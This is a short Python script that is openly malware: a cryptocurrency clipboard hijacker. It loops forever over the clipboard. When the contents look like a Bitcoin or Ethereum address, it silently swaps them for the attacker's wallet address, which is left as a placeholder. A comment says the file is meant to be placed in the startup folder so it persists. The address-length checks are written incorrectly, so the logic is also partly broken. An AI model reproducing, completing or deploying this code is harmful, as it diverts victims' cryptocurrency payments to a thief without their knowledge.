import pyperclip as pc
import time
from os import getcwd
from shutil import copy

#moves program to startup folder. rename file_name.exe


BTC_address = "BTC WALLET HERE"
ETH_address = "ETH WALLET HERE"
#coming soon?
USDT_address = "USDT WALLET HERE"
BNB_wallet = "BNB WALLET HERE"
USDC_wallet = "USDC WALLET HERE"
SOL_wallet = "SOL WALLET HERE"
XRP_wallet = "XRP WALLET HERE"

def clip():
    s = str(pc.paste())
    length_of_s = len(s)
    wallet_check = ""
    time.sleep(0.25)
    if s.startswith("1"):
        if length_of_s > 26 < 36:
            pc.copy(BTC_address)
    elif s.startswith("bc1",0,3):
        if length_of_s > 26 < 36:
            pc.copy(BTC_address)
    elif s.startswith("3"):
        if length_of_s > 26 < 36:
            pc.copy(BTC_address)
    elif s.startswith("0x",0,2):
        if length_of_s > 20 < 40:
            pc.copy(ETH_address)
    else:
        wallet_check = "ignore"


while True:
    clip()
